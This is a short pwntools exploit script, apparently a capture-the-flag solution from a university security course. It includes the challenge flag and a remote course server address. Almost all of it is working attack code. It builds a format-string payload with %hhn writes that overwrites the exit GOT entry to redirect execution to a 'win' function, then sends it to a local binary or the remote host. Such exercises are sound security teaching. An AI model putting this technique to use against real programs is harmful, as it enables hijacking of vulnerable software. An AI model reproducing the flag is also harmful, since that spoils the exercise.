#!/usr/bin/python
from pwn import *

#SSof{You_G_O_T_me}

WIN = 0x804849b
EXIT_PLT = 0x804a018

payload = p32(EXIT_PLT)
payload += p32((EXIT_PLT+1))
payload += p32((EXIT_PLT+2))
payload += p32((EXIT_PLT+3))
payload += b'%7$0139x'
payload += b'%7$hhn'

payload += b'%8$0232x.'
payload += b'%8$hhn'

payload += b'%9$0127x.'
payload += b'%9$hhn'

payload += b'%10$0259x.'
payload += b'%10$hhn'

def pad(s):
    return s + b'X'*(128-len(s))



f = open('exploitBYTES', 'wb')
f.write(payload)
f.close

def local():
    context(arch='i386', os='linux')
    s = process('./bin')
    s.sendline(payload)
    s.interactive()

def web():
    r = remote('mustard.stt.rnl.tecnico.ulisboa.pt', 22197)
    r.send(payload)
    print(r.recv())

web()

